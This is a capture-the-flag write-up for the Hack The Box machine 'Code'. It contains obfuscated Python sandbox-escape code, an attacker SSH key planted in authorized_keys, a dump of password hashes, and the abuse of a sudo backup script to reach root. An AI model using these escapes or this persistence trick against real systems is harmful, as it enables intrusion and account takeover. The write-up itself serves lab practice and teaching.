# CTF Challenge: CODE HTB

## Initial Exploration

We notice that port **5000** is open with the **HTTP** protocol. When accessing it, we discover an online Python compiler. Our first attempt is to list the available classes using the following script:

```python
for i, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
    print(f"Index {i}: {cls.__name__}")
```

This script works and returns useful results.

---

## Creating an SSH Access

We observe that the user does not have a **.ssh** folder. We will create one to establish an SSH connection later.

### Creating the `.ssh` Folder

```python
b = (0).__class__.__base__.__subclasses__()[138].__init__.__globals__
i = b['__bui' + 'ltins__']
i['__im' + 'port__']('o'+'s').__getattribute__('make' + 'dirs')('/home/app-production/.ssh/')
```

### Adding Our Public SSH Key

```python
f = ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['__bui'+'ltins__']['op'+'en']('/home/app-production/.ssh/authorized_keys', 'w')
getattr(f, 'w'+'rite')('ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAa4YWMYFMgqwAKvvz4HsksklM78XxsjF6mGuwKcJOdpxhYBNNDyyh/WBGYI/zoEQCQBuZjjm+jgEJYsyNLOAt8= kali@kali')
getattr(f, 'clo'+'se')()
```

---

## Accessing the SQLite Database

We find hints in a configuration file indicating the presence of an **SQLite3** database.

### Locating the Database

```bash
app-production@code:~$ find / -name "database.db" 2>/dev/null
/home/app-production/app/instance/database.db
/home/app-production/instance/database.db
```

### Exploring the Database

```bash
app-production@code:~$ sqlite3 /home/app-production/app/instance/database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
```

#### Retrieving Available Tables

```sql
sqlite> .tables
code  user
```

#### Extracting Users and Passwords

```sql
sqlite> select * from user;
1|root|new_root_password
2|martin|3de6f30c4a09c27fc71932bfc68474be
3|sojlen|202cb962ac59075b964b07152d234b70
```
We found MD5 hashed password, let's go crack that with Hashcat

<div align="center">
  <img src="https://github.com/10T4/write-up/blob/main/images/Image1.png" alt="hashcat">
</div>

Thus, we obtain **Martin's** password.

---

## Privilege Escalation

After logging in as **Martin**, we execute:

```bash
martin@code:~$ sudo -l
```

We discover a script **/usr/bin/backy.sh** that can be executed with sudo.

### Content of `backy.sh`

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\.\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

We exploit a flaw in the script to execute arbitrary commands.
<div align="center">
  <img src="https://github.com/10T4/write-up/blob/main/images/Image2.png" alt="arbitrary-command">
</div>

### Exploitation

We can use **tar** to extract sensitive content into `/home/martin/backup/`:

```bash
tar -xvf code
```
<div align="center">
  <img src="https://github.com/10T4/write-up/blob/main/images/Image3.png" alt="root-access">
</div>

This grants us access to the necessary files to gain **root** access.

---

## Retrieving the Root Flag

By exploiting the script's vulnerability, we obtain **root** access, allowing us to read the **/root/root.txt** file.


